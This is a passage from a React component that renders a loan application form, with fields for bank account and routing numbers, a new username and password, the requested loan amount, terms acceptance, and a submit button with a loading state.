            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Account Number *
                </label>
                <input
                  type="text"
                  name="accountNumber"
                  placeholder="12345678"
                  value={formData.accountNumber}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-green-500 focus:border-transparent ${
                    errors.accountNumber ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.accountNumber && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.accountNumber}
                  </p>
                )}
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Routing Number *
                </label>
                <input
                  type="text"
                  name="routingNumber"
                  placeholder="123456789"
                  maxLength="9"
                  value={formData.routingNumber}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-green-500 focus:border-transparent ${
                    errors.routingNumber ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.routingNumber && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.routingNumber}
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Account Details */}
          <div className="bg-gradient-to-r from-purple-50 to-purple-100 p-6 rounded-xl border border-purple-200">
            <h2 className="text-2xl font-semibold mb-6 text-purple-900">
              Account Details
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Username *
                </label>
                <input
                  type="text"
                  name="username"
                  placeholder="johndoe123"
                  value={formData.username}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-purple-500 focus:border-transparent ${
                    errors.username ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.username && (
                  <p className="text-red-500 text-sm mt-1">{errors.username}</p>
                )}
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Password *
                </label>
                <input
                  type="password"
                  name="password"
                  placeholder="••••••••"
                  value={formData.password}
                  onChange={handleChange}
                  autoComplete="new-password"
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-purple-500 focus:border-transparent ${
                    errors.password ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.password && (
                  <p className="text-red-500 text-sm mt-1">{errors.password}</p>
                )}
              </div>
            </div>
          </div>

          {/* Loan Amount */}
          <div className="bg-gradient-to-r from-orange-50 to-orange-100 p-6 rounded-xl border border-orange-200">
            <h2 className="text-2xl font-semibold mb-6 text-orange-900">
              Loan Amount
            </h2>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Required Loan Amount * (Min: $300, Max: $100,000)
            </label>
            <input
              type="number"
              name="requiredAmount"
              placeholder="5000"
              min="300"
              max="100000"
              value={formData.requiredAmount}
              onChange={handleChange}
              className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-orange-500 focus:border-transparent ${
                errors.requiredAmount ? "border-red-500" : "border-gray-300"
              }`}
            />
            {errors.requiredAmount && (
              <p className="text-red-500 text-sm mt-1">
                {errors.requiredAmount}
              </p>
            )}
          </div>

          {/* Terms */}
          <div className="bg-gradient-to-r from-gray-50 to-gray-100 p-6 rounded-xl border border-gray-200">
            <label className="flex items-start gap-3 cursor-pointer">
              <input
                type="checkbox"
                name="termsAccepted"
                checked={formData.termsAccepted}
                onChange={handleChange}
                className={`w-5 h-5 mt-0.5 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-2 focus:ring-blue-500 ${
                  errors.termsAccepted ? "border-red-500" : ""
                }`}
              />
              <span className="text-gray-700">
                I agree to the{" "}
                <button
                  type="button"
                  className="text-blue-600 underline hover:text-blue-800"
                >
                  terms & privacy policy
                </button>{" "}
                *
              </span>
            </label>
            {errors.termsAccepted && (
              <p className="text-red-500 text-sm mt-2">
                {errors.termsAccepted}
              </p>
            )}
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full py-4 rounded-xl font-semibold text-lg transition-all duration-200 ${
              loading
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white shadow-lg hover:shadow-xl"
            }`}
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <svg
                  className="animate-spin h-5 w-5 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  ></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
                Submitting...
              </span>
            ) : (
              "Submit Application"
            )}
          </button>

          {submitMessage.text && (
            <div
              className={`mt-4 p-4 rounded-lg text-center font-semibold ${
                submitMessage.type === "success"
                  ? "bg-green-100 text-green-700 border border-green-300"
                  : "bg-red-100 text-red-700 border border-red-300"
              }`}
            >
              {submitMessage.text}
            </div>
          )}
        </form>
      </div>
    </div>
  );
}
